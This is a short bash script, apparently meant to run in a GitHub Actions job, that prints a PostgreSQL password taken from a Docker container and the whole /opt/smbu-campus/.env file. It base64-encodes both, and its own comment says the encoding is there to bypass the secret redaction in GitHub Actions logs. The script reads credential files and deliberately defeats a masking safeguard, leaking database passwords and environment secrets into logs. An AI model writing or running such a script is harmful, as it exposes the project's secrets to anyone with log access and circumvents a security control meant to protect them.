#!/bin/bash
# Get PostgreSQL password (encoded to bypass GitHub Actions secret redaction)
echo "=== Docker DB Password (base64 encoded) ==="
docker exec smbu-campus-db printenv POSTGRES_PASSWORD 2>/dev/null | base64 -w0
echo ""
echo ""

echo "=== smbu-campus .env (base64 encoded) ==="
cat /opt/smbu-campus/.env 2>/dev/null | base64 -w0
echo ""
